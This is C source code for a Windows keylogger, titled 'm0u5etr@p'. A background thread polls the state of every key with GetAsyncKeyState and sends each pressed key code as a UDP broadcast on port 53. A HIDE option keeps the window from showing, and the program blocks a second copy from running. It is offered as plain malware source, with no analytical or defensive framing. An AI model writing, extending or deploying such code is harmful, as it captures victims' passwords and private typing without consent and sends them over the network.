#define WIN32_LEAN_AND_MEAN

#include <windows.h>
#include <WinSock2.h>
#include <string.h>
#include <stdlib.h>

//#define HIDE

HINSTANCE hInst;
BOOL      Flag;

SOCKET sock;
struct sockaddr_in addr;

LPCTSTR szWindowClass   = TEXT("m0u5etr@p");
LPCTSTR szTitle         = TEXT("m0u5etr@p");

ATOM             MyRegisterClass(HINSTANCE hInstance);
BOOL             InitInstance(HINSTANCE, int);
LRESULT CALLBACK WndProc(HWND, UINT, WPARAM, LPARAM);
void			udpSend(int);

DWORD WINAPI     Logger(LPVOID lpvoid);

void			initSocket();

int APIENTRY WinMain(HINSTANCE hInstance,
                     HINSTANCE hPrevInstance,
                     LPTSTR    lpCmdLine,
                     int       nCmdShow)
{
    MSG msg;

    MyRegisterClass(hInstance);

    if (!InitInstance (hInstance, nCmdShow)) 
    {
       return FALSE;
    }

    BOOL bRet;
    while ((bRet = GetMessage(&msg, NULL, 0, 0)) != 0) 
    {
        if(bRet == -1)
            break;

        if (!TranslateAccelerator(msg.hwnd, NULL, &msg)) 
        {
            TranslateMessage(&msg);
            DispatchMessage(&msg);
        }
    }

    return (int) msg.wParam;
}



ATOM MyRegisterClass(HINSTANCE hInstance)
{
    WNDCLASSEX wcex;

    wcex.cbSize = sizeof(WNDCLASSEX); 

    wcex.style          = CS_NOCLOSE;
    wcex.lpfnWndProc    = (WNDPROC)WndProc;
    wcex.cbClsExtra     = 0;
    wcex.cbWndExtra     = 0;
    wcex.hInstance      = hInstance;
    wcex.hIcon          = LoadIcon(hInstance, NULL);
    wcex.hCursor        = LoadCursor(NULL, IDC_ARROW);
    wcex.hbrBackground  = (HBRUSH)(COLOR_WINDOW+1);
    wcex.lpszMenuName   = (LPCTSTR)NULL;
    wcex.lpszClassName  = szWindowClass;
    wcex.hIconSm        = LoadIcon(wcex.hInstance, NULL);

    return RegisterClassEx(&wcex);
}



BOOL InitInstance(HINSTANCE hInstance, int nCmdShow)
{
   HWND hWnd;

    if(FindWindow(szWindowClass, szTitle)!=NULL){
		return FALSE; 
	}

   hInst = hInstance;

   //hWnd = CreateWindow(szWindowClass, szTitle, WS_OVERLAPPEDWINDOW,
    //  CW_USEDEFAULT, 0, CW_USEDEFAULT, 0, NULL, NULL, hInstance, NULL);

	  hWnd = CreateWindowEx(0,szWindowClass,szTitle,WS_OVERLAPPEDWINDOW,
	CW_USEDEFAULT, CW_USEDEFAULT, CW_USEDEFAULT, CW_USEDEFAULT, HWND_MESSAGE, NULL, hInstance, NULL);

   if (!hWnd)
   {
      return FALSE;
   }

#ifndef HIDE
   ShowWindow(hWnd, nCmdShow);
   UpdateWindow(hWnd);
#endif

   return TRUE;
}



LRESULT CALLBACK WndProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)
{
    static HANDLE Thread;

    switch (message) 
    {
    case WM_CREATE:
        Flag = TRUE;
        DWORD ID;
        if((Thread = CreateThread(NULL, 0, Logger, (LPVOID)NULL, 0, &ID)) == NULL){
            DestroyWindow(hWnd);
        }
        break;
    case WM_DESTROY:
		closesocket(sock);
		WSACleanup();
        Flag = FALSE;
        WaitForSingleObject(Thread, 3000);
        PostQuitMessage(0);
        break;
    default:
        return DefWindowProc(hWnd, message, wParam, lParam);
    }
    return 0;
}

void udpSend(int kcode) {
	char buf[8];
	_itoa_s(kcode,buf,sizeof(buf),10);
	strcat(buf,"\0");
	sendto(sock,buf,5,0,(struct sockaddr *)&addr,sizeof(addr));
}

void initSocket() {
	WSAData wsaData;
	BOOL yes = 1;

	WSAStartup(MAKEWORD(2,2),&wsaData);

	sock = socket(AF_INET,SOCK_DGRAM,0);

	addr.sin_family = AF_INET;
	addr.sin_port = htons(53);
	addr.sin_addr.S_un.S_addr = inet_addr("255.255.255.255");

	setsockopt(sock,SOL_SOCKET,SO_BROADCAST,(char *)&yes,sizeof(yes));
}

DWORD WINAPI Logger(LPVOID lpvoid)
{
	initSocket();
    while(Flag){
		int c;
		for (c = 0 ; c < 256 ; c++) {
			if (GetAsyncKeyState(c) & 0x0001) {
				udpSend(c);
				continue;
			}
		}
        Sleep(50);
    }
    return 0;
}

